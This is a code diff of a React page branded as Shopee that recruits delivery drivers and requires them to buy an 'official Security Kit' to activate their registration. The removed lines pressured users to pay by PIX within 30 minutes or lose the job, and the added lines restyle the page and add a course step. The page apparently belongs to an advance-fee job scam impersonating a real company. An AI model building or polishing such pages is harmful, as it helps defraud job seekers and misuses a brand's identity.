@@ -448,8 +448,8 @@ const Entrega: React.FC = () => {
       <div className="flex-grow container mx-auto px-4 py-8">
         <div className="w-full max-w-4xl mx-auto">
           <div className="bg-white shadow-md rounded-lg overflow-hidden mb-8">
-            <div className="bg-[#FFF8F6] p-4 border-b border-[#E83D2220]">
-              <h3 className="font-semibold text-[#E83D22]">Status do Cadastro</h3>
+            <div className="bg-[#FFF8F6] p-4 border-b border-[#E83D2220] rounded-t-[4px]">
+              <h3 className="font-semibold text-[#E83D22]">ATIVE SEU CADASTRO</h3>
             </div>
             <div className="p-6">
               <div className="flex flex-col md:flex-row gap-6">
@@ -478,26 +478,21 @@ const Entrega: React.FC = () => {
                       <div className="bg-gray-50 p-4 rounded-md">
                         <ul className="list-disc pl-5 space-y-1 text-gray-600">
                           <li>Adquirir Kit de Segurança oficial</li>
-                          <li>Aguardar entrega em até 5 dias úteis</li>
+                          <li>Realize o Curso Online de 3 horas</li>
                           <li>Começar a receber entregas na sua região</li>
                         </ul>
                       </div>
                     </div>
                   </div>
                   
-                  <div className="mt-6">
-                    <p className="text-sm text-gray-500 italic">
-                      Importante: Assim que o Kit de Segurança for entregue, você já estará apto para 
-                      começar a realizar entregas imediatamente pela Shopee.
-                    </p>
-                  </div>
+
                 </div>
               </div>
             </div>
           </div>
           
           <div className="bg-white shadow-md rounded-lg overflow-hidden mb-8">
-            <div className="bg-[#FFF8F6] p-4 border-b border-[#E83D2220]">
+            <div className="bg-[#FFF8F6] p-4 border-b border-[#E83D2220] rounded-t-[4px]">
               <h3 className="font-semibold text-[#E83D22]">Kit de Segurança Oficial Shopee</h3>
             </div>
             <div className="p-6">
@@ -522,8 +517,7 @@ const Entrega: React.FC = () => {
                   </ul>
                   <div className="bg-yellow-50 p-3 rounded-md border border-yellow-200 mb-4">
                     <p className="text-sm text-yellow-800">
-                      <strong>Importante:</strong> O uso do kit completo é obrigatório durante todas 
-                      as entregas. O não uso pode resultar em suspensão temporária.
+                      <strong>Importante:</strong> O uso do kit completo é obrigatório durante todas as entregas.
                     </p>
                   </div>
                   <div className="bg-orange-50 p-4 rounded-md border border-orange-200 mb-2">
@@ -537,7 +531,7 @@ const Entrega: React.FC = () => {
           </div>
           
           <div className="bg-white shadow-md rounded-lg overflow-hidden mb-8">
-            <div className="bg-[#FFF8F6] p-4 border-b border-[#E83D2220]">
+            <div className="bg-[#FFF8F6] p-4 border-b border-[#E83D2220] rounded-t-[4px]">
               <h3 className="font-semibold text-[#E83D22]">Endereço para Entrega</h3>
             </div>
             <div className="p-6">
@@ -666,55 +660,12 @@ const Entrega: React.FC = () => {
                   </div>
                 </div>
                 
-                {/* Box de alerta sobre o kit de segurança obrigatório */}
-                <div className="bg-red-50 border border-red-200 rounded-md p-4 mb-4">
-                  <div className="flex items-start">
-                    <div className="text-red-500 mt-0.5 mr-3">
-                      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-                        <circle cx="12" cy="12" r="10"></circle>
-                        <line x1="12" y1="8" x2="12" y2="12"></line>
-                        <line x1="12" y1="16" x2="12.01" y2="16"></line>
-                      </svg>
-                    </div>
-                    <div>
-                      <h4 className="text-red-800 font-medium text-sm"><strong>ATENÇÃO:</strong> Aceite os termos e depois clique em "Comprar e Ativar Cadastro".</h4>
-                      <p className="text-red-700 text-sm mt-1">
-                        O pagamento do Kit de Segurança do Entregador é <strong>obrigatório</strong> e você precisa 
-                        adquirir este kit oficial para exercer a função de entregador Shopee.
-                      </p>
-                      <p className="text-red-700 text-sm mt-2">
-                        Ao prosseguir, você se compromete a realizar o pagamento via PIX no prazo de 30 minutos, 
-                        caso contrário, perderá o direito à vaga de entregador.
-                      </p>
-                      
-                      {/* Botão on/off (switch) */}
-                      <div className="mt-4 flex items-center">
-                        <div className="mr-1 flex-shrink-0 w-[75px]">
-                          <button 
-                            className={`relative inline-flex h-7 w-16 items-center rounded-full transition-colors focus:outline-none ${acceptedTerms ? 'bg-green-500' : 'bg-gray-300'}`}
-                            onClick={() => setAcceptedTerms(!acceptedTerms)}
-                            type="button"
-                          >
-                            <span
-                              className={`inline-block h-6 w-6 transform rounded-full bg-white shadow-md transition-transform ${acceptedTerms ? 'translate-x-9' : 'translate-x-1'}`}
-                            />
-                          </button>
-                        </div>
-                        <span className="ml-1 text-sm font-medium text-gray-700">
-                          Concordo com os termos e me comprometo a realizar o pagamento
-                        </span>
-                      </div>
-                    </div>
-                  </div>
-                </div>
-                
                 <Button
                   type="submit"
-                  className={`w-full text-white font-medium py-6 text-base rounded-[3px] transition-all ${acceptedTerms ? 'bg-[#E83D22] hover:bg-[#d73920]' : 'bg-[#E83D2280] cursor-not-allowed'}`}
+                  className="w-full text-white font-medium py-6 text-base rounded-[3px] transition-all bg-[#E83D22] hover:bg-[#d73920]"
                   style={{ height: '50px' }}
-                  disabled={!acceptedTerms}
                 >
-                  Comprar e Ativar Cadastro
+                  Confirmar endereco
                 </Button>
               </form>
             </div>
